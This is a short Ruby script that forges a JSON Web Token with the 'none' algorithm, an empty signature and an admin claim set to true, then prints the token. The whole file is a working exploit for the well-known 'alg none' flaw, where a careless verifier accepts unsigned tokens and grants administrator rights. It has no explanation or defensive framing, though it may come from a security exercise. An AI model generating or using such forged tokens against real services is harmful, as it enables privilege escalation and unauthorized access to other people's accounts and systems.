require 'openssl'
require 'base64'
require 'json'

def encode(hash_content)
  Base64.encode64(
    JSON.generate(hash_content)
  ).tr('+/', '-_').gsub(/[\n=]/, '')
end

def encode_signature(message)
  Base64.encode64('').tr('+/', '-_').gsub(/[\n=]/, '')
end

def jwt(header, payload_hash)
  encoded_header = encode(header)
  encoded_payload = encode(payload_hash)
  encoded_signature = encode_signature(
    [encoded_header, encoded_payload].join('.')
  )

  [encoded_header, encoded_payload, encoded_signature].join('.')
end

puts jwt(
  { typ: 'JWT', alg: 'none'},
  {
    "admin" => true
  }
)
